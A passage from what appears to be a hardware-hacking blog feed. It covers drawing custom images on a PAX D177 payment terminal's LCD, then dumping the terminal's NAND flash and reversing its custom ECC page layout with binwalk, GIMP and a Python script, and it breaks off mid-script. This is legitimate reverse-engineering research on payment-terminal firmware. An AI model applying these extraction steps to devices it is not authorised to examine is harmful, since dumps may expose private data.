<span class="cm">/* Call this macro repeatedly. After each use, the pixel data can be extracted */</span>

<span class="cp">#define HEADER_PIXEL(data,pixel) {\
pixel[0] = (((data[0] - 33) &lt;&lt; 2) | ((data[1] - 33) &gt;&gt; 4)); \
pixel[1] = ((((data[1] - 33) &amp; 0xF) &lt;&lt; 4) | ((data[2] - 33) &gt;&gt; 2)); \
pixel[2] = ((((data[2] - 33) &amp; 0x3) &lt;&lt; 6) | ((data[3] - 33))); \
data += 4; \
}
</span>
<span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">header_data</span> <span class="o">=</span>

<span class="s">")#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A"</span>

<span class="s">")#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A"</span>
<span class="p">(...)</span>
</code></pre></div></div>

<p>The ST7735 LCD the machine uses has several pixel modes. I decided to use RGB565 since that would be exactly 16 bit wide (which gives two bytes over SPI) and easy to convert. I was lazy, so I used a local LLM to generate a macro to convert it, which worked pretty good (I didn’t remember how to convert the spaces, were not sure if was just cutting bits or actually a LUT)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define RGB888_TO_RGB565(r, g, b) ( \
(((r) &amp; 0xF8) &lt;&lt; 8) | </span><span class="cm">/* 5 bits of red, shifted to bits 15-11 */</span><span class="cp"> \
(((g) &amp; 0xFC) &lt;&lt; 3) | </span><span class="cm">/* 6 bits of green, shifted to bits 10-5 */</span><span class="cp"> \
(((b) &amp; 0xF8) &gt;&gt; 3) </span><span class="cm">/* 5 bits of blue, shifted to bits 4-0 */</span><span class="cp"> \
)
</span></code></pre></div></div>

<p>LLM generated a bit cut, and it worked nice. So I left as is.  Then I could just send it in the code directly:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">{</span>
        <span class="c1">// 0x2C RAMWR</span>
        <span class="n">SendCMD</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">);</span>                <span class="c1">// RAMWR</span>
        <span class="n">P15_ON</span><span class="p">;</span>
        <span class="kt">uint8_t</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
        <span class="c1">// Fill the screen with white color // 16 bit mode</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">160</span> <span class="o">*</span> <span class="mi">128</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HEADER_PIXEL</span><span class="p">(</span><span class="n">header_data</span><span class="p">,</span> <span class="n">rgb</span><span class="p">);</span>
            <span class="kt">uint16_t</span> <span class="n">color</span> <span class="o">=</span> <span class="n">RGB888_TO_RGB565</span><span class="p">(</span><span class="n">rgb</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
            <span class="n">SendCMDParam</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span><span class="n">color</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// Send high byte</span>
            <span class="n">SendCMDParam</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span> <span class="n">color</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span> <span class="c1">// Send low byte</span>
        <span class="p">}</span>
        <span class="n">P15_OFF</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>And tested it on my emulator:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/947b71be153e6405b62909b62e93385d_MD5.jpeg" alt="" /></p>

<h2 id="result">Result</h2>

<p><img src="/assets/Running code in a Credit Card Payment Machine/23c966b8036e41fe19f78b38bfa8bf73_MD5.jpeg" alt="" /></p>

<h2 id="next-steps">Next steps</h2>

<p>Running doom, of course :D - I planned of making this article only after doom, but I found out that the 1MB of ram, its sort of low for standard doom. I saw there is a RP2040 port of doom which works great, so I will probably port it to that core.</p>

<p>I still want to reverse engineer about everything I can from these SoCs, since they’re pretty powerful and has nice accelerators which can be used for some other secure stuff. I also managed to dump both MH1903S and MH1903 boot roms which has their own interesting aspects. I almost finished reversing engineering the MH1903S boot rom and I plan to make an article about it soon. It seens like that is several versions of boot roms around (they basically all do the same thing, but has different revisions and builds). So if you stumble across any MH190x device which you can either JTAG it or doesn’t have boot signature enabled. Let me know, lets make an archive of boot roms 😃</p>

<h2 id="notes">Notes</h2>

<ol>
  <li>There was a bit of research over both PAX and PagBank codes for finding out how it interacts with the hardware. No security flaw was explored and there is nothing they can do about the CPU swapping.</li>
  <li>There is nothing specific to PagBank in that case. Any D177 should work fine. The work here <strong>is not due a security flaw</strong>.</li>
  <li>Megahunt does a LOT of “Silicon OEM” (the AIR105 mentioned here is just one of them). Decaps should point out.</li>
  <li>Besides the boot rom, I don’t share binaries I dumped from machines. I hadn’t reverse engineer enough to know which info they store, and they might contain stuff that should be private. So please don’t ask, you can dump it yourself. Its pretty easy.</li>
  <li>Following articles will show how I reverse engineered the boot loaders, pax image format and found out how the LCD pins were mapped.</li>
</ol>

<h3 id="links">Links</h3>

<ul>
  <li><a href="https://github.com/racerxdl/platformio-air105">https://github.com/racerxdl/platformio-air105</a> - PIO Platform for AIR105/MH1903</li>
  <li><a href="https://github.com/racerxdl/framework-megahunt">https://github.com/racerxdl/framework-megahunt</a> - PIO Framework for Megahunt devices</li>
  <li><a href="https://github.com/racerxdl/air105-uploader">https://github.com/racerxdl/air105-uploader</a> - Python script to upload using the boot rom</li>
  <li><a href="https://archive.org/details/mh-1903-s-v-1.5">https://archive.org/details/mh-1903-s-v-1.5</a> - Some usefull MH1903 datasheets</li>
  <li><a href="https://github.com/racerxdl/d177-crasharalho">https://github.com/racerxdl/d177-crasharalho</a> - Crasharalho Source Code</li>
  <li><a href="https://github.com/racerxdl/megahunt-bootroms">https://github.com/racerxdl/megahunt-bootroms</a> - Megahunt Bootroms</li>
  <li><a href="https://github.com/racerxdl/mhdumper">https://github.com/racerxdl/mhdumper</a> - Megahunt ROM Dumper Tool</li>
</ul>

<h3 id="timeline">Timeline</h3>

<ul>
  <li><strong>01/04/2025</strong> - Resumed works on reverse-engineering and mapping</li>
  <li><strong>17/06/2025</strong> - Got first code running (crasharalho)</li>
  <li><strong>22/06/2025</strong> - Finished article, sent for peer review (tech-wise)</li>
  <li><strong>27/08/2025</strong> - Send the article to Pag for review</li>
  <li><strong>28/08/2025</strong> - Approved by Pag for publishing</li>
  <li><strong>31/08/2025</strong> - More reviews, translation, etc…</li>
  <li><strong>05/09/2025</strong> - Published</li>
</ul>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Payment Machines" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="D177" /><category term="D188" /><category term="Minizinha" /><category term="Moderninha" /><category term="Smart" /><category term="Sunmi" /><category term="TecToy" /><category term="Transire" /><category term="Megahunt" /><category term="MH1903" /><category term="Air105" /><category term="LuatOS" /><summary type="html"><![CDATA[Disclaimer]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/Running%20code%20in%20a%20PAX%20Credit%20Card%20Payment%20Machine/7383f9c5e7832856c90b25549fb08115_MD5.jpeg" /><media:content medium="image" url="https://lucasteske.dev/assets/Running%20code%20in%20a%20PAX%20Credit%20Card%20Payment%20Machine/7383f9c5e7832856c90b25549fb08115_MD5.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">NAND Flash Memory Analysis and Decoding - Unveiling ECC Scattering in Unknown Devices</title><link href="https://lucasteske.dev/2024/01/decoding-and-analysis-nand-flash" rel="alternate" type="text/html" title="NAND Flash Memory Analysis and Decoding - Unveiling ECC Scattering in Unknown Devices" /><published>2024-01-16T23:48:00+00:00</published><updated>2024-01-16T23:48:00+00:00</updated><id>https://lucasteske.dev/2024/01/decoding-and-analysis-nand-flash</id><content type="html" xml:base="https://lucasteske.dev/2024/01/decoding-and-analysis-nand-flash"><![CDATA[<h2 id="exploring-nand-memories">Exploring NAND Memories</h2>

<p>When in possession of a device whose internals one wishes to understand, accessing the content of the flash memory is not always straightforward. Due to the nature of NAND memories, an error correction algorithm is applied to all content, which can cause unintentional obfuscation of the content. Some manufacturers of processors that directly control NAND-type memories or developers of “protected” software choose to customize the way these algorithms function.</p>

<p>In this article, we will explore the basic structure of flash memory, why error correction exists, and how to identify the scattering of the error correction algorithm used.</p>

<h1 id="flash-memories">Flash Memories</h1>

<p>Flash memories have emerged as the backbone of digital storage in the contemporary era. Found in devices as varied as SSDs, USB drives, and SD cards, these memories bring an irresistible combination of speed, durability, and the ability to retain data even in the absence of power.</p>

<p>Historically, before the rise of flash memories, the main storage devices were based on magnetic media, such as hard disks and floppy disks, or on EPROMs (Erasable Programmable Read-Only Memory). While magnetic media had moving parts and were more prone to physical failures, EPROMs required a specific erasure process, making the rewriting of data a slower and less efficient process.</p>

<p>Within the category of flash memories, we find different variations, with NOR and NAND versions being the most predominant. In this article, we will focus on NAND flash memories, recognized for their high storage density and widely used in everyday storage devices, ensuring speed and reliability in reading and writing data.</p>

<h2 id="anatomy-of-a-nand-cell">Anatomy of a NAND Cell</h2>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell.svg" alt="Flash Memory Cell" />
<em>Detailed diagram of a NAND cell</em></p>

<p>At the heart of flash memory technology lies the intricate architecture of a NAND cell. The illustration above outlines the fundamental components of the cell: the Control Gate, the Floating Gate, insulating oxide layers, along with N-Type Source and N-Type Drain terminals, all built on a P-type substrate.
Bits are stored in the flash memory by retaining electrons in the Floating Gate.</p>

<p>During the write operation, a voltage is imposed on the Control Gate, inducing electrons to cross the oxide barrier and lodge in the Floating Gate. Once the electrons reach the Floating Gate, they remain there, denoting a “written” state.
<img src="/assets/posts/analise-e-decodificacao-flash/flash-write.svg" alt="Flash memory write process" /></p>

<p>To read the stored information, a voltage is applied to the Control Gate. If there are electrons in the Floating Gate, they will create a repulsive force, blocking the flow of electrons from the Source to the Drain. This state is recognized as a “0” bit. However, if the Floating Gate is unoccupied, the electric current will flow unimpeded, corresponding to a “1” bit.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" alt="Programmed state of a NAND cell" />
<em>NAND cell in the “written” state</em></p>

<p>Finally, the electronic configuration — whether its absence or presence — determines whether the cell is representing a “0” or “1” bit. The subsequent image shows a cell in the “erased” state, characterized by the free flow of electrons between the terminals.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-erased.svg" alt="Erased state of a NAND cell" />
<em>NAND cell in the “erased” state</em></p>

<h2 id="nand-memory-architecture">NAND Memory Architecture</h2>

<p><img src="/assets/posts/analise-e-decodificacao-flash/nand-block.svg" alt="NAND Block Structure" />
<em>Diagram representing the organization of a NAND block</em></p>

<p>NAND memory is meticulously organized in a hierarchical structure. Starting with the smallest unit, we have the cell. These cells are grouped to form pages. Moving up the hierarchy, multiple pages are then consolidated to constitute a block, as illustrated in the diagram above.</p>

<p>This structural arrangement is not just for organization. It plays a vital role in the efficiency of flash memory operations. An important detail to consider is that, in various devices based on flash technology, the erase operation is performed at the block level, and not on individual cells or pages.</p>

<p>The image exemplifies a NAND memory containing pages of 2048 bytes of data added with 64 bytes designated for error correction, totaling 2112 bytes per page. These pages are grouped into blocks that house 64 pages each, resulting in 128K bytes of data and 4K bytes for correction.</p>

<p>The additional bytes in each page are not mere supplements. They are intrinsic to the memory’s integrity. Although stored in the same way as any other byte, they are often allocated for specific functions, such as parity in Error Correction (ECC) algorithms. This correction is indispensable, as during manufacturing or even over use, some cells of the NAND memory may present defects or wear out, compromising the accuracy of stored data. Therefore, ECC acts as a protective layer, ensuring the reliability of data even in the presence of imperfections in the memory.</p>

<h2 id="reading-flash-memories">Reading Flash Memories</h2>

<p>When dealing with reading and writing in Flash memories, a variety of devices are available. For flash memories with less conventional encapsulations, like BGA (Ball Grid Array), I often turn to the RT809H programmer, using a specific adapter for such encapsulation. The flash memory in question was originally extracted from a device by PAX, a model available on Mercado Livre under the description “card machine”. It is worth mentioning that the encapsulation type of this flash memory is BGA63, indicating an arrangement of 63 pins in the ball-grid-array format.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash_memory.jpg" alt="Flash Memory in the universal programmer RT809H ready for reading" /><em>Flash Memory in the universal programmer RT809H ready for reading</em></p>

<p>After extracting the data from the flash memory, a crucial step is using the <code class="language-plaintext highlighter-rouge">binwalk</code> tool. This command functions to scan and list possible signatures of known files contained in the memory dump, allowing a preliminary analysis of its content. This stage is essential to discern if we will face challenges when trying to decipher the stored data, such as if they are encrypted.</p>

<p>It is important to note that the image produced by the RT809H programmer depicts the content of the flash memory in its purest state, without any filtering. This means that the ECC (Error-Correcting Code) parity bits are included. This feature can introduce nuances during the analysis, as not all signatures will be accurately recognized, especially considering files that may start at the end of a memory page.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
438548        0x6B114         Base64 standard index table
<span class="o">(</span>...<span class="o">)</span>
3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
7839754       0x77A00A        uImage header, header size: 64 bytes, header CRC: 0x538F3DE9, created: 2021-05-27 08:14:51, image size: 3696472 bytes, Data Address: 0x80800000, Entry Point: 0x80800000, data CRC: 0xA22F74A5, OS: Linux, CPU: ARM, image <span class="nb">type</span>: OS Kernel Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"Linux-2.7.93.9707R"</span>
7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>little-endian<span class="o">)</span>
7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 <span class="o">(</span>null <span class="nb">date</span><span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>
20815882      0x13DA00A       uImage header, header size: 64 bytes, header CRC: 0xF95F6882, created: 2021-05-27 08:20:25, image size: 8185419 bytes, Data Address: 0x83800000, Entry Point: 0x83800000, data CRC: 0xE5674944, OS: Linux, CPU: ARM, image <span class="nb">type</span>: RAMDisk Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"RAMDISK-2.7.93.9707R"</span>
<span class="o">(</span>...<span class="o">)</span>
20815946      0x13DA04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:20:23
33792010      0x203A00A       uImage header, header size: 64 bytes, header CRC: 0x588DFFBC, created: 2021-05-27 08:19:13, image size: 6412038 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x32979F1E, OS: Linux, CPU: ARM, image <span class="nb">type</span>: Firmware Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"BASE-2.7.93.9707R"</span>
33792074      0x203A04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:19:11
46768138      0x2C9A00A       UBI erase count header, version: 1, EC: 0x3, VID header offset: 0x800, data offset: 0x1000
</code></pre></div></div>

<p>Entropy assessment is an effective technique to detect encrypted or compressed content in a memory. When we talk about entropy in data, we are referring to the amount of information or unpredictability contained in these data. The <code class="language-plaintext highlighter-rouge">binwalk</code> tool offers a specific mode for measuring this entropy.</p>

<p>Files that are compressed or encrypted tend to display an apparently random data pattern, resulting in an entropy measure that approaches 1. In contrast, “plain-text” files or unencoded data generally have significantly lower entropy, tending towards values closer to 0, as their content is more predictable.</p>

<p>To explore this functionality in <code class="language-plaintext highlighter-rouge">binwalk</code>, use the <code class="language-plaintext highlighter-rouge">-E</code> option, which activates the entropy measurement mode. When executed, you will receive a graph that visually represents the entropy variations throughout the file, facilitating the identification of encrypted or compressed segments.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk <span class="nt">-E</span> F59L1G81MA@BGA63_1111.BIN
DECIMAL       HEXADECIMAL     ENTROPY
<span class="nt">--------------------------------------------------------------------------------</span>
0             0x0             Falling entropy edge <span class="o">(</span>0.027839<span class="o">)</span>
7880704       0x784000        Rising entropy edge <span class="o">(</span>0.995063<span class="o">)</span>
12345344      0xBC6000        Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
20869120      0x13E7000       Rising entropy edge <span class="o">(</span>0.997811<span class="o">)</span>
29257728      0x1BE7000       Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
33824768      0x2042000       Rising entropy edge <span class="o">(</span>0.999076<span class="o">)</span>
40386560      0x2684000       Falling entropy edge <span class="o">(</span>0.372003<span class="o">)</span>
47253504      0x2D10800       Falling entropy edge <span class="o">(</span>0.725862<span class="o">)</span>
62879744      0x3BF7800       Falling entropy edge <span class="o">(</span>0.737729<span class="o">)</span>
67244032      0x4021000       Rising entropy edge <span class="o">(</span>0.966013<span class="o">)</span>
67311616      0x4031800       Falling entropy edge <span class="o">(</span>0.776734<span class="o">)</span>
69611520      0x4263000       Falling entropy edge <span class="o">(</span>0.790624<span class="o">)</span>
69679104      0x4273800       Rising entropy edge <span class="o">(</span>0.972091<span class="o">)</span>
69814272      0x4294800       Falling entropy edge <span class="o">(</span>0.836573<span class="o">)</span>
70322176      0x4310800       Falling entropy edge <span class="o">(</span>0.844177<span class="o">)</span>
72689664      0x4552800       Falling entropy edge <span class="o">(</span>0.643195<span class="o">)</span>
74008576      0x4694800       Falling entropy edge <span class="o">(</span>0.783870<span class="o">)</span>
74584064      0x4721000       Falling entropy edge <span class="o">(</span>0.471472<span class="o">)</span>
75259904      0x47C6000       Falling entropy edge <span class="o">(</span>0.787818<span class="o">)</span>
76613632      0x4910800       Falling entropy edge <span class="o">(</span>0.823394<span class="o">)</span>
76748800      0x4931800       Falling entropy edge <span class="o">(</span>0.687502<span class="o">)</span>
82837504      0x4F00000       Falling entropy edge <span class="o">(</span>0.360502<span class="o">)</span>
84291584      0x5063000       Falling entropy edge <span class="o">(</span>0.775172<span class="o">)</span>
84934656      0x5100000       Falling entropy edge <span class="o">(</span>0.714603<span class="o">)</span>
95385600      0x5AF7800       Falling entropy edge <span class="o">(</span>0.788762<span class="o">)</span>
103233536     0x6273800       Falling entropy edge <span class="o">(</span>0.775540<span class="o">)</span>
104992768     0x6421000       Falling entropy edge <span class="o">(</span>0.750242<span class="o">)</span>
124475392     0x76B5800       Falling entropy edge <span class="o">(</span>0.281623<span class="o">)</span>
125253632     0x7773800       Falling entropy edge <span class="o">(</span>0.750710<span class="o">)</span>
133507072     0x7F52800       Falling entropy edge <span class="o">(</span>0.798972<span class="o">)</span>
137566208     0x8331800       Falling entropy edge <span class="o">(</span>0.768062<span class="o">)</span>
137701376     0x8352800       Falling entropy edge <span class="o">(</span>0.743758<span class="o">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-entropy.svg" alt="Entropy of the Read Image" /><em>Entropy of the Read Image</em></p>

<p>In the presented entropy graph, the areas of high entropy stand out as peaks that approach the value of 1 on the vertical axis. These regions point to sections of data that have a distribution of bits that appears random, which is typical of compressed or encrypted data.</p>

<p>By correlating the position of these peaks with the information provided by the <code class="language-plaintext highlighter-rouge">binwalk</code> command, we can understand the nature of these high entropy segments. In our case, the points of high entropy correspond to compressed parts, and not encrypted data. This deduction becomes clear when we see that <code class="language-plaintext highlighter-rouge">binwalk</code> identified signatures related to data compressed with <em>gzip</em> at the indicated positions.</p>

<p>The fact of recognizing these signatures clearly shows that the content, although compressed, is not encrypted. If it were, <code class="language-plaintext highlighter-rouge">binwalk</code> would not have identified these signatures, as encrypted data looks like a bunch of random information, without specific patterns. Thus, looking at both the entropy graph and the information from <code class="language-plaintext highlighter-rouge">binwalk</code>, we get a good idea of the structure and type of data in the analyzed flash memory.</p>

<h2 id="when-ecc-scattering-is-not-standard">When ECC Scattering is Not Standard</h2>

<p>To ensure that data is accessed accurately, it is crucial to exclude the parity bits inserted into each memory page. Assuming that the last 64 bytes of each page are allocated for ECC, we can create a Python script that reads the 2112 bytes (representing the full memory page) and writes only the 2048 bytes corresponding to the pure data, disregarding the ECC, into a new file.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">F59L1G81MA@BGA63_1111.BIN</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">o</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">FIXEDDATA.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[:</span><span class="mi">2048</span><span class="p">])</span> <span class="c1"># Nuke ECC
</span>  <span class="n">o</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">o</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>With the data now cleaned, the next step is to identify the files present to verify the efficacy of our assumption. A quick look at the list of files highlighted by <em>binwalk</em> will give us an indication.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
438548        0x6B114         Base64 standard index table
439650        0x6B562         DES PC1 table
439738        0x6B5BA         DES PC2 table
440945        0x6BA71         DES SP2, little endian
441738        0x6BD8A         DES SP1, little endian
477666        0x749E2         Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
478540        0x74D4C         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
479065        0x74F59         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
1384724       0x152114        Base64 standard index table
1385826       0x152562        DES PC1 table
1385914       0x1525BA        DES PC2 table
1387121       0x152A71        DES SP2, little endian
1387914       0x152D8A        DES SP1, little endian
1423842       0x15B9E2        Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
1424716       0x15BD4C        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
1425241       0x15BF59        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
7839754       0x77A00A        uImage header, header size: 64 bytes, header <span class="o">(</span>...<span class="o">)</span>
7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>litt<span class="o">(</span>...<span class="o">)</span>
7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression,   <span class="o">(</span>...<span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>
</code></pre></div></div>

<p>We can identify a <em>bitmap</em> right at the beginning of the image, where <em>binwalk</em> is even able to identify its size and bit depth:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
</code></pre></div></div>

<p>A distinctive characteristic of <em>bitmaps</em> is the way they store color information. The bytes in the file map directly to the colors of the image. Thus, when we have a region of the image that displays a single color, that color is represented by consecutive sequences of identical bytes in the file. This property is especially useful when we try to discern the distribution of error-correcting bits (ECC). If a segment of the bitmap, fitting to a memory page, displays the same color as another segment on a different page, it’s expected that their corresponding ECC bits would be identical.</p>

<p>Considering that the identified image has a color depth of 24 bpp (bits per pixel), each pixel is represented by 3 bytes. Given a memory page capacity of 2048 bytes, this translates to about 682 pixels per page. This is slightly more than two lines of the image. The attempt to access the <em>bitmap</em> in its current form suggests inconsistencies, leading us to question our initial assumptions about the distribution of ECC bits.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/pax-broken.jpg" alt="Corrupted PAX Logo" /><em>Corrupted PAX Logo</em></p>

<p>For proper interpretation, it’s vital to extract multiple pages from the memory containing the bitmap data in an aligned manner. This way, we can ensure that at every 2112 byte interval, we are dealing with a new page, not a continuation of the previous one. Subsequently, we can use an image editing software that allows manipulating images in arbitrary “RAW” formats. In this context, we will use GIMP to analyze the raw image data. One of the advantages of GIMP is the flexibility in defining the image geometry and pixel formatting.</p>

<p>To facilitate the identification of ECC bits, we’ll set the image width to 2112, corresponding to the memory page size. This will allow us to visualize each memory page as a distinct line. We’ll choose an 8-bit per pixel representation in monochrome to ensure an exact correspondence of 2112 bytes per line. Regarding the height, we’ll opt for at least 100 lines to provide a clear view of variations between different memory pages.</p>

<p>Examining the visual representation provided by GIMP, we notice clearly defined segments of 512 bytes within each memory page. These segments are interspersed with thinner columns, whose appearance seems directly influenced by the adjacent block.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis.jpg" alt="512 byte blocks" /><em>512 byte blocks</em></p>

<p>Looking closer, we realize that the completely black lines display a column with consistent patterns to the left of the 512-byte mark. Contrary to this, lines that show some variation also manifest discrepancies in that same column on the left. Based on this observation, we can infer that the columns positioned both to the left and right of the 512-byte segment represent parity data, and are not an intrinsic part of the bitmap. This becomes even more evident considering that the first lines of the bitmap are entirely black.</p>

<p>Considering the memory page as a whole, another detail stands out: despite the observed pattern, there is a completely white column in an unexpected position. Additionally, the first column, which theoretically should be white, appears to be displaced or altered in some way.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-1.png" alt="Column apparently switched place" /><em>Column apparently switched place</em></p>

<p>The hypothesis suggests that, for some reason, these columns may have been switched during the scattering process. To validate this assumption, a practical approach would be to use GIMP itself to reposition the column and assess if the resulting content aligns harmoniously with the rest of the memory page.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-3.png" alt="Switching identified columns" /><em>Switching identified columns</em></p>

<p>The above image validates our conjecture, highlighting that the reallocation of columns provides a more coherent visualization of the content. Although it seems unusual at first glance, considering the security nature of the device, it is plausible to think that this altered arrangement could be a deliberate way of hiding data. This peculiarity is not mentioned in any public documentation available for the device’s processor.</p>

<p>Based on these findings, we have the tools needed to refine our Python script, aiming to eliminate the parity bits and rearrange the 512-byte segments, in order to obtain a refined and coherent image.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">F59L1G81MA@BGA63_1111.BIN</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">o</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">FIXEDDATA.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">535</span><span class="p">:</span><span class="mi">535</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1060</span><span class="p">:</span><span class="mi">1060</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1585</span><span class="p">:</span><span class="mi">1585</span><span class="o">+</span><span class="mi">512</span><span class="p">])</span>
  <span class="n">data</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="mi">48</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">page</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
